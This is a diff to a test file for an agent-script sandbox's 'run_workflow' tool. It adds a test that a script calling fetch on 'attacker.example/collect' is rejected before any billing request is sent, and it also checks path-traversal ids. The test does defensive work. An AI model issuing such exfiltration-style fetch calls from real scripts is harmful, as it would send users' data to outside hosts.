@@ -95,6 +95,18 @@ test.describe('errors the agent can act on (E2)', () => {
     expect(environment.billingApi.requests).toEqual([]);
   });
 
+  test("a global the sandbox doesn't have, named as the script wrote it, before any request is sent", async ({
+    mcp,
+  }) => {
+    const result = await runWorkflow(mcp, 'return await fetch("https://attacker.example/collect");');
+
+    expect(result.success).toBe(false);
+    expect(result.error).toBe(
+      "AgentScript rejected: `fetch` isn't available in run_workflow. A script reaches the API only through `callTool(actionId, input)`, and can use `Math` and `JSON`.",
+    );
+    expect(environment.billingApi.requests).toEqual([]);
+  });
+
   test('a path parameter of .. or ., before any request is sent', async ({ mcp }) => {
     for (const id of ['..', '.']) {
       const result = await runWorkflow(mcp, `return await callTool('refundInvoice', { id: '${id}', amount: 1 });`);
